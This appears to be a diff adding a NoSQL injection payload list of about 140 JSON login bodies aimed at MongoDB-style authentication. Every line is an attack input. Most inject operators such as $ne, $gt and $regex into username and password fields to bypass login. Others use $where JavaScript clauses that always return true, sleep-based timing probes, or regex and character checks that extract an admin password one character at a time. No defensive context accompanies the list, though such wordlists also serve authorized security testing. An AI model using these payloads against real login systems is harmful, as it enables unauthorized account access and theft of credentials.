@@ -1,0 +1,142 @@
+{"username":{"$ne":null},"password":{"$ne":null}}
+{"username":{"$ne":""},"password":{"$ne":""}}
+{"username":{"$gt":""},"password":{"$gt":""}}
+{"username":{"$exists":true},"password":{"$exists":true}}
+{"username":{"$regex":".*"},"password":{"$regex":".*"}}
+{"username":{"$regex":"."},"password":{"$regex":"."}}
+{"username":"admin","password":{"$ne":null}}
+{"username":"administrator","password":{"$ne":null}}
+{"username":"root","password":{"$ne":null}}
+{"username":{"$in":["admin"]},"password":{"$ne":null}}
+{"username":{"$in":["admin","administrator"]},"password":{"$ne":null}}
+{"username":"admin","password":{"$ne":""}}
+{"username":"admin","password":{"$gt":""}}
+{"username":"admin","password":{"$regex":".*"}}
+{"username":"admin","password":{"$exists":true}}
+{"username":{"$regex":"^admin"},"password":{"$ne":null}}
+{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
+{"username":"administrator","password":{"$gt":""}}
+{"username":{"$nin":["guest"]},"password":{"$ne":null}}
+{"username":["admin"],"password":{"$ne":null}}
+{"username":["admin","root"],"password":{"$ne":null}}
+{"username":"admin","password":{"$ne":"wrong"}}
+{"username":"admin","password":{"$nin":["invalid"]}}
+{"username":{"$ne":null},"password":{"$gt":""}}
+{"username":{"$ne":null},"password":{"$regex":"^p"}}
+{"username":{"$regex":"admin"},"password":{"$regex":".*"}}
+{"$where":"1==1"}
+{"username":"admin","$where":"1==1"}
+{"username":{"$ne":null},"$where":"this.password.length>0"}
+{"$where":"sleep(5000)"}
+{"username":"admin","$where":"sleep(5000)"}
+{"username":"admin","$where":"this.password.match(/^a/) && sleep(5000)"}
+{"username":"admin","$where":"this.password[0]=='a'"}
+{"username":"admin","$where":"this.password.length > 6"}
+{"$where":"this.username=='admin'"}
+{"$where":"this.password.length > 0"}
+{"username":{"$regex":"admin"},"password":{"$regex":"^a"}}
+{"username":"admin","password":{"$regex":"^a"}}
+{"username":"admin","password":{"$regex":"^b"}}
+{"username":"admin","password":{"$regex":"^p"}}
+{"username":"admin","password":{"$regex":"^pa"}}
+{"username":"admin","password":{"$regex":"^pass"}}
+{"username":"admin","password":{"$regex":"^admin"}}
+{"username":"admin","password":{"$regex":"^123"}}
+{"username":{"$gt":""},"password":{"$ne":null}}
+{"username":{"$exists":false},"password":{"$ne":null}}
+{"username":{"$type":"string"},"password":{"$ne":null}}
+{"username":{"$type":1},"password":{"$ne":null}}
+{"username":{"$not":{"$eq":null}},"password":{"$ne":null}}
+{"username":{"$eq":"admin"},"password":{"$ne":null}}
+{"username":{"$all":["admin"]},"password":{"$ne":null}}
+{"username":{"$ne":"undefined"},"password":{"$ne":"undefined"}}
+{"username":{"$not":{"$eq":""}},"password":{"$not":{"$eq":""}}}
+{"username":{"$lte":"z"},"password":{"$lte":"z"}}
+{"username":{"$gte":""},"password":{"$gte":""}}
+{"username":{"$regex":"^.*$"},"password":{"$regex":"^.*$"}}
+{"username":"admin","password":{"$not":{"$gt":"z"}}}
+{"username":"admin","password":{"$type":"string"}}
+{"username":"admin","password":{"$size":1}}
+{"username":{"$mod":[1,0]},"password":{"$ne":null}}
+{"username":"admin\u0000","password":{"$ne":null}}
+{"username":"admin","password":{"$regex":"^.{1,20}$"}}
+{"username":{"$regex":".*"},"password":{"$not":{"$eq":"invalid"}}}
+{"$and":[{"username":{"$ne":"guest"}},{"password":{"$ne":"guest"}}]}
+{"$or":[{"username":"admin"},{"username":"administrator"}]}
+{"username":{"$regex":"admin","$options":"i"},"password":{"$ne":null}}
+{"username":{"$regex":"^ad.in$"},"password":{"$ne":null}}
+{"username":"admin","$where":"this.password.length == 8"}
+{"username":"admin","$where":"Object.keys(this).length > 0"}
+{"username":{"$ne":null},"password":{"$regex":".*","$options":"m"}}
+{"username":{"$type":2},"password":{"$type":2}}
+{"username":{"$exists":true},"password":{"$not":{"$size":0}}}
+{"$nor":[{"username":"wrong"},{"password":"wrong"}]}
+{"username":{"$not":{"$in":["guest","test"]}},"password":{"$ne":null}}
+{"username":"admin","$where":"this.password.toString().length>0"}
+{"username":"admin","$where":"this.password.match(/^[0-9]+$/)"}
+{"$where":"this.username.substring(0,1)=='a'"}
+{"username":{"$eq":null},"password":{"$eq":null}}
+{"username":{"$lt":"z"},"password":{"$lt":"z"}}
+{"username":{"$gte":"a"},"password":{"$gte":"a"}}
+{"username":{"$lte":"admin"},"password":{"$lte":"password"}}
+{"username":{"$in":[null,"admin"]},"password":{"$ne":null}}
+{"username":{"$nin":[null]},"password":{"$nin":[null]}}
+{"username":{"$exists":true},"password":{"$exists":false}}
+{"username":{"$exists":false},"password":{"$exists":true}}
+{"username":{"$type":2},"password":{"$ne":""}}
+{"username":{"$type":"array"},"password":{"$ne":null}}
+{"username":{"$size":0},"password":{"$ne":null}}
+{"username":{"$size":1},"password":{"$ne":""}}
+{"username":{"$all":["admin","user"]},"password":{"$ne":null}}
+{"username":{"$elemMatch":{"$eq":"admin"}},"password":{"$ne":null}}
+{"username":{"$regex":"^adm.*n$"},"password":{"$ne":null}}
+{"username":{"$regex":"^a.*"},"password":{"$regex":"^p.*"}}
+{"username":{"$regex":"^.{1,}$"},"password":{"$regex":"^.{1,}$"}}
+{"username":{"$regex":"^.{0,}$"},"password":{"$ne":null}}
+{"username":{"$regex":"admin$"},"password":{"$ne":null}}
+{"username":{"$regex":"^admin$"},"password":{"$ne":null}}
+{"username":{"$regex":"^admin","$options":"i"},"password":{"$regex":".*"}}
+{"username":{"$regex":"admin","$options":"m"},"password":{"$ne":null}}
+{"username":{"$not":{"$regex":"guest"}},"password":{"$ne":null}}
+{"username":{"$not":{"$in":["guest","test"]}},"password":{"$ne":""}}
+{"username":{"$mod":[2,0]},"password":{"$ne":null}}
+{"username":{"$mod":[3,1]},"password":{"$ne":null}}
+{"username":{"$ne":0},"password":{"$ne":0}}
+{"username":{"$gt":0},"password":{"$gt":0}}
+{"username":{"$lt":999999},"password":{"$lt":999999}}
+{"username":{"$in":["admin","root","test"]},"password":{"$regex":"^.{0,}$"}}
+{"username":{"$nin":["invalid","fake"]},"password":{"$regex":"^.{0,}$"}}
+{"username":"admin","password":{"$exists":false}}
+{"username":"admin","password":{"$type":2}}
+{"username":"admin","password":{"$type":"array"}}
+{"username":"admin","password":{"$size":0}}
+{"username":"admin","password":{"$not":{"$eq":"password"}}}
+{"username":"admin","password":{"$not":{"$in":["123","admin"]}}}
+{"username":"admin","password":{"$regex":"^[a-z]+$"}}
+{"username":"admin","password":{"$regex":"^[0-9]+$"}}
+{"username":"admin","password":{"$regex":"^[a-z0-9]+$"}}
+{"username":"admin","password":{"$regex":"^.{8,}$"}}
+{"username":"admin","password":{"$regex":"^.{0,8}$"}}
+{"username":"admin","password":{"$regex":"^.{5,10}$"}}
+{"username":"admin","password":{"$regex":"^.{1,100}$"}}
+{"username":"admin","password":{"$regex":"^p.*"}}
+{"username":"admin","password":{"$regex":"^adm.*"}}
+{"username":"admin","password":{"$regex":"^root.*"}}
+{"username":"admin","$where":"this.username.length > 0"}
+{"username":"admin","$where":"this.username == this.username"}
+{"username":"admin","$where":"this.password != null"}
+{"username":"admin","$where":"this.password.length < 100"}
+{"username":"admin","$where":"this.password.length >= 0"}
+{"username":"admin","$where":"this.password.indexOf('a')==0"}
+{"username":"admin","$where":"this.password.includes('a')"}
+{"username":"admin","$where":"this.password.match(/.*/)!=null"}
+{"$where":"true"}
+{"$where":"false || true"}
+{"$where":"this.username != ''"}
+{"$where":"this.password != ''"}
+{"$where":"this.username.length >= 0"}
+{"$where":"this.password.length >= 0"}
+{"$where":"Object.keys(this).length >= 1"}
+{"$where":"Object.values(this).length >= 1"}
+{"$where":"this.username && this.password"}
+{"$where":"this.username || this.password"}
